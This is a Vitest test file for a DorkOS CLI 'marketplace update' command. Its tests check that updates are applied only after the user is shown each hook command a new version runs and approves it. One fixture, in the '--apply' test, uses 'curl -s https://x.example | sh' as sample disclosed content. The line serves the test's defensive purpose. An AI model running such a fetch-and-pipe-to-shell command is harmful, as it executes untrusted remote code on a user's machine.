import { describe, it, expect, vi, beforeEach, afterEach, type MockInstance } from 'vitest';

import { parseUpdateArgs, runUpdate } from '../commands/update.js';

/**
 * Build a fetch `Response`-like object that the api-client can consume.
 */
function mockResponse(status: number, body: unknown): Response {
  return {
    ok: status >= 200 && status < 300,
    status,
    statusText: 'mock',
    json: async () => body,
  } as unknown as Response;
}

/** One server check result; defaults describe an available update. */
function check(overrides: Record<string, unknown> = {}) {
  return {
    packageName: 'demo-pkg',
    installedVersion: '1.2.0',
    latestVersion: '1.3.0',
    hasUpdate: true,
    marketplace: 'dorkos-community',
    status: 'update-available',
    installedVersionSource: 'package',
    latestVersionSource: 'package',
    ...overrides,
  };
}

/** What a new version runs: one hook, the given command. */
function runs(command: string) {
  return {
    hooks: [{ event: 'PreToolUse', matcher: null, command, source: null }],
    schedules: [],
    mcpServers: [],
    lspServers: [],
    monitors: [],
    executables: [],
    skillTools: [],
  };
}

/** Everything printed to stdout, one string. */
function printed(spy: MockInstance<typeof console.log>): string {
  return spy.mock.calls.map((c) => String(c[0])).join('\n');
}

describe('parseUpdateArgs', () => {
  it('parses a bare invocation with no args', () => {
    const args = parseUpdateArgs([]);
    expect(args).toEqual({
      name: undefined,
      apply: false,
      yes: false,
      approvalToken: undefined,
      projectPath: undefined,
    });
  });

  it('parses a single name', () => {
    const args = parseUpdateArgs(['demo-pkg']);
    expect(args.name).toBe('demo-pkg');
  });

  it('parses --apply, --yes, --approval and --project', () => {
    const args = parseUpdateArgs([
      'demo-pkg',
      '--apply',
      '-y',
      '--approval',
      'tok-1',
      '--project',
      '/tmp/web',
    ]);
    expect(args).toEqual({
      name: 'demo-pkg',
      apply: true,
      yes: true,
      approvalToken: 'tok-1',
      projectPath: '/tmp/web',
    });
  });

  it('throws on unknown option', () => {
    expect(() => parseUpdateArgs(['--nope'])).toThrow(
      /Unknown option for 'marketplace update': --nope/
    );
  });
});

describe('runUpdate', () => {
  let logSpy: MockInstance<typeof console.log>;
  let errSpy: MockInstance<typeof console.error>;

  beforeEach(() => {
    logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
  });

  afterEach(() => {
    logSpy.mockRestore();
    errSpy.mockRestore();
    vi.unstubAllGlobals();
  });

  it('prints one line per check in each of the three kinds', async () => {
    // Purpose: an update, a current package and an unknown one each read
    // differently, and a commit-identified version prints as a short commit.
    const fetchMock = vi.fn().mockResolvedValueOnce(
      mockResponse(200, {
        checks: [
          check({ packageName: 'flow', installedVersion: '0.7.2', latestVersion: '0.7.3' }),
          check({
            packageName: 'same',
            installedVersion: '1.0.0',
            latestVersion: '1.0.0',
            hasUpdate: false,
            status: 'current',
          }),
          check({
            packageName: 'offline',
            latestVersion: '',
            hasUpdate: false,
            marketplace: '',
            status: 'unknown',
            note: "couldn't reach github.com",
          }),
          check({
            packageName: 'by-commit',
            installedVersion: 'abc1234def5678abc1234def5678abc1234def56',
            latestVersion: 'fedcba9876543210fedcba9876543210fedcba98',
            installedVersionSource: 'commit',
            latestVersionSource: 'commit',
            marketplace: '',
          }),
        ],
      })
    );
    vi.stubGlobal('fetch', fetchMock);

    const code = await runUpdate({ name: 'flow' });

    expect(code).toBe(0);
    const out = printed(logSpy);
    expect(out).toContain('flow  0.7.2 → 0.7.3  (dorkos-community)');
    expect(out).toContain('same  up to date (1.0.0)');
    expect(out).toContain("offline  could not check: couldn't reach github.com");
    expect(out).toContain('by-commit  commit abc1234 → commit fedcba9');
  });

  it('prints the spec example for one available update in advisory mode', async () => {
    // Purpose: the exact line a person sees, including how to install it.
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValueOnce(
        mockResponse(200, {
          checks: [
            check({ packageName: 'flow', installedVersion: '0.7.2', latestVersion: '0.7.3' }),
          ],
          applied: [],
        })
      )
    );

    await runUpdate({ name: 'flow', projectPath: '/p' });

    expect(printed(logSpy)).toContain('1 update available. Run again with --apply to install it.');
  });

  it('never says everything is up to date while a package could not be checked', async () => {
    // Purpose: the old summary said "All N up to date" about a set that
    // silently excluded the packages it could not check.
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValueOnce(
        mockResponse(200, {
          checks: [
            check({ hasUpdate: false, status: 'current', latestVersion: '1.2.0' }),
            check({
              packageName: 'flow',
              status: 'unknown',
              hasUpdate: false,
              latestVersion: '',
              note: "couldn't reach github.com",
            }),
          ],
          applied: [],
        })
      )
    );

    const code = await runUpdate({ name: 'demo-pkg' });

    expect(code).toBe(0);
    const out = printed(logSpy);
    expect(out).not.toMatch(/All \d+/);
    expect(out).toContain('1 up to date, 1 could not be checked.');
  });

  it('exits 1 when a named package is installed nowhere', async () => {
    // Purpose: `dorkos update <typo>` must fail loudly for a script, as it did
    // before the per-target isolation turned the 404 into a printed line.
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValueOnce(mockResponse(404, { error: 'Package not installed: flwo' }))
    );

    const code = await runUpdate({ name: 'flwo' });

    expect(code).toBe(1);
    expect(printed(logSpy)).toContain('flwo  could not check: Package not installed: flwo');
  });

  describe('without a name: the all-packages door', () => {
    /** One installation's check; defaults describe a global update. */
    function installation(overrides: Record<string, unknown> = {}) {
      return {
        ...check({ packageName: 'flow', installedVersion: '0.7.2', latestVersion: '0.7.3' }),
        installPath: '/home/me/.dork/plugins/flow',
        type: 'plugin',
        scope: 'global',
        ...overrides,
      };
    }

    it('checks every installation with one request, naming where each non-global one lives', async () => {
      // Purpose: a name-less run used to list installs and then send one
      // request per package; the same package in two places must still read
      // as two different lines.
      const fetchMock = vi.fn().mockResolvedValueOnce(
        mockResponse(200, {
          checks: [
            installation({ hasUpdate: false, status: 'current', latestVersion: '0.7.2' }),
            installation({
              scope: 'override',
              agentPath: '/work/alpha',
              agentName: 'Alpha',
              installPath: '/work/alpha/.dork/plugins/flow',
            }),
            installation({
              scope: 'agent-local',
              agentPath: '/work/beta',
              installPath: '/work/beta/.dork/plugins/flow',
              status: 'unknown',
              hasUpdate: false,
              latestVersion: '',
              marketplace: '',
              note: "couldn't reach github.com",
            }),
          ],
        })
      );
      vi.stubGlobal('fetch', fetchMock);

      const code = await runUpdate({});

      expect(code).toBe(0);
      expect(fetchMock).toHaveBeenCalledTimes(1);
      expect(fetchMock.mock.calls[0][0]).toMatch(/\/api\/marketplace\/updates$/);
      expect(fetchMock.mock.calls[0][1].method).toBe('GET');
      const out = printed(logSpy);
      expect(out).toContain('flow  up to date (0.7.2)');
      expect(out).toContain('flow [Alpha]  0.7.2 → 0.7.3  (dorkos-community)');
      expect(out).toContain("flow [/work/beta]  could not check: couldn't reach github.com");
      expect(out).toContain('1 update available, 1 up to date, 1 could not be checked.');
    });

    it("checks one project's view with --project", async () => {
      const fetchMock = vi.fn().mockResolvedValueOnce(mockResponse(200, { checks: [] }));
      vi.stubGlobal('fetch', fetchMock);

      await runUpdate({ projectPath: '/work/my app' });

      expect(fetchMock.mock.calls[0][0]).toContain(
        `/api/marketplace/updates?projectPath=${encodeURIComponent('/work/my app')}`
      );
    });

    it.each([false, true])(
      'says the running DorkOS is older than the CLI when it has no updates door (apply: %s)',
      async (apply) => {
        // Purpose: a server started before this CLI answers the router's bare
        // "Not found"; a person needs to hear "restart DorkOS" instead.
        vi.stubGlobal(
          'fetch',
          vi
            .fn()
            .mockResolvedValueOnce(mockResponse(404, { error: 'Not found', code: 'API_NOT_FOUND' }))
        );

        const code = await runUpdate({ apply });

        expect(code).toBe(1);
        expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toMatch(
          /older than this CLI.*Restart DorkOS/s
        );
      }
    );

    it('says so when nothing is installed', async () => {
      vi.stubGlobal('fetch', vi.fn().mockResolvedValueOnce(mockResponse(200, { checks: [] })));

      const code = await runUpdate({});

      expect(code).toBe(0);
      expect(printed(logSpy)).toContain('No installed packages to check.');
    });

    it('--apply prints what each new version runs, then updates exactly that (DOR-2306)', async () => {
      // Purpose: the person approves what they read. The run prints every
      // command a new version runs, and the apply sends each installation back
      // with the version and disclosure it printed, so the server installs
      // only what still matches.
      const alpha = installation({
        scope: 'override',
        agentPath: '/work/alpha',
        agentName: 'Alpha',
        installPath: '/work/alpha/.dork/plugins/flow',
        disclosed: runs('curl -s https://x.example | sh'),
      });
      const fetchMock = vi
        .fn()
        .mockResolvedValueOnce(mockResponse(200, { checks: [alpha] }))
        .mockResolvedValueOnce(
          mockResponse(200, {
            checks: [
              {
                ...alpha,
                applied: {
                  ok: true,
                  packageName: 'flow',
                  version: '0.7.3',
                  installPath: '/work/alpha/.dork/plugins/flow',
                },
              },
            ],
          })
        );
      vi.stubGlobal('fetch', fetchMock);

      const code = await runUpdate({ apply: true, yes: true, projectPath: '/work/alpha' });

      expect(code).toBe(0);
      expect(fetchMock.mock.calls[0][1].method).toBe('GET');
      expect(fetchMock.mock.calls[1][0]).toMatch(/\/api\/marketplace\/updates$/);
      expect(fetchMock.mock.calls[1][1].method).toBe('POST');
      expect(JSON.parse(fetchMock.mock.calls[1][1].body)).toEqual({
        apply: true,
        projectPath: '/work/alpha',
        targets: [
          {
            installPath: '/work/alpha/.dork/plugins/flow',
            latestVersion: '0.7.3',
            disclosed: runs('curl -s https://x.example | sh'),
          },
        ],
      });
      const out = printed(logSpy);
      expect(out).toContain('What the new version runs:');
      expect(out).toContain('curl -s https://x.example | sh');
      expect(out).toContain('Applied:');
      expect(out).toContain('  flow [Alpha]@0.7.3 → /work/alpha/.dork/plugins/flow');
      expect(out).not.toContain('Run again with --apply');
    });

    it('--apply without --yes asks first, and a no (or no terminal) updates nothing', async () => {
      // Purpose: printing is not approving. Without a yes nothing is sent, and
      // a run with no terminal to answer from declines rather than applies.
      const fetchMock = vi
        .fn()
        .mockResolvedValueOnce(
          mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
        );
      vi.stubGlobal('fetch', fetchMock);

      const code = await runUpdate({ apply: true });

      expect(code).toBe(0);
      expect(fetchMock).toHaveBeenCalledTimes(1);
      expect(printed(logSpy)).toContain('Nothing was updated.');
    });

    it('--apply with a name updates only that package\u2019s installations, and says when it has none', async () => {
      const fetchMock = vi
        .fn()
        .mockResolvedValueOnce(
          mockResponse(200, {
            checks: [
              installation({ disclosed: null }),
              installation({ packageName: 'other', installPath: '/o', disclosed: null }),
            ],
          })
        )
        .mockResolvedValueOnce(mockResponse(200, { checks: [] }));
      vi.stubGlobal('fetch', fetchMock);

      await runUpdate({ name: 'flow', apply: true, yes: true });

      const body = JSON.parse(fetchMock.mock.calls[1][1].body);
      expect(body.targets.map((t: { installPath: string }) => t.installPath)).toEqual([
        '/home/me/.dork/plugins/flow',
      ]);

      vi.stubGlobal('fetch', vi.fn().mockResolvedValueOnce(mockResponse(200, { checks: [] })));
      expect(await runUpdate({ name: 'flwo', apply: true, yes: true })).toBe(1);
      expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toContain(
        'flwo is not installed here.'
      );
    });

    it('never offers a new version it could not say what it runs', async () => {
      // Purpose: only what can be shown can be approved.
      const fetchMock = vi
        .fn()
        .mockResolvedValueOnce(mockResponse(200, { checks: [installation()] }));
      vi.stubGlobal('fetch', fetchMock);

      const code = await runUpdate({ apply: true, yes: true });

      expect(code).toBe(0);
      expect(fetchMock).toHaveBeenCalledTimes(1);
    });

    it('prints how to retry when a person has to approve it first (an agent\u2019s run)', async () => {
      vi.stubGlobal(
        'fetch',
        vi
          .fn()
          .mockResolvedValueOnce(
            mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
          )
          .mockResolvedValueOnce(
            mockResponse(202, {
              status: 'requires_confirmation',
              confirmationToken: 'tok-9',
              message: 'A person must approve these updates in DorkOS.',
            })
          )
      );

      const code = await runUpdate({ name: 'flow', apply: true, yes: true });

      expect(code).toBe(1);
      const err = errSpy.mock.calls.map((c) => String(c[0])).join('\n');
      expect(err).toContain('A person must approve these updates in DorkOS.');
      expect(err).toContain(
        'Retry with: dorkos marketplace update flow --apply --yes --approval tok-9'
      );
    });

    it('sends the approval token on the retry', async () => {
      const fetchMock = vi
        .fn()
        .mockResolvedValueOnce(
          mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
        )
        .mockResolvedValueOnce(mockResponse(200, { checks: [] }));
      vi.stubGlobal('fetch', fetchMock);

      await runUpdate({ apply: true, yes: true, approvalToken: 'tok-9' });

      expect(JSON.parse(fetchMock.mock.calls[1][1].body).confirmationToken).toBe('tok-9');
    });

    it('updates nothing and exits 1 when a new version changed what it runs since the check', async () => {
      vi.stubGlobal(
        'fetch',
        vi
          .fn()
          .mockResolvedValueOnce(
            mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
          )
          .mockResolvedValueOnce(
            mockResponse(409, {
              error: 'What an update would install is not what was shown.',
              code: 'disclosure_changed',
            })
          )
      );

      const code = await runUpdate({ apply: true, yes: true });

      expect(code).toBe(1);
      expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toContain(
        'Nothing was updated. What an update would install is not what was shown.'
      );
    });

    it('exits 1 and says why when a reinstall failed, after listing the ones that landed', async () => {
      // Purpose: a script running --apply must be able to tell that an update
      // did not land, and a person must see which one and why.
      const flow = installation({ disclosed: null });
      const broken = installation({
        packageName: 'broken',
        scope: 'agent-local',
        agentPath: '/work/alpha',
        agentName: 'Alpha',
        installPath: '/work/alpha/.dork/plugins/broken',
        disclosed: null,
      });
      vi.stubGlobal(
        'fetch',
        vi
          .fn()
          .mockResolvedValueOnce(mockResponse(200, { checks: [flow, broken] }))
          .mockResolvedValueOnce(
            mockResponse(200, {
              checks: [
                {
                  ...flow,
                  applied: { ok: true, packageName: 'flow', version: '0.7.3', installPath: '/p' },
                },
                { ...broken, applyError: 'disk full' },
              ],
            })
          )
      );

      const code = await runUpdate({ apply: true, yes: true });

      expect(code).toBe(1);
      const out = printed(logSpy);
      expect(out).toContain('  flow@0.7.3 → /p');
      expect(out).toContain('Could not update:');
      expect(out).toContain('  broken [Alpha]: disk full');
    });

    it('exits 1 with the server’s reason when the request itself fails', async () => {
      vi.stubGlobal(
        'fetch',
        vi
          .fn()
          .mockResolvedValueOnce(
            mockResponse(403, { error: 'Access denied: projectPath outside boundary' })
          )
      );

      const code = await runUpdate({ projectPath: '/etc' });

      expect(code).toBe(1);
      expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toContain(
        'Access denied: projectPath outside boundary'
      );
    });
  });

  it('exits 1 with the "Cannot reach" message when the server is unreachable', async () => {
    // Purpose: failing to reach the server at all is the one error that
    // still ends the run.
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new TypeError('fetch failed')));

    const code = await runUpdate({ name: 'demo-pkg' });

    expect(code).toBe(1);
    expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toContain(
      'Cannot reach DorkOS server'
    );
  });
});
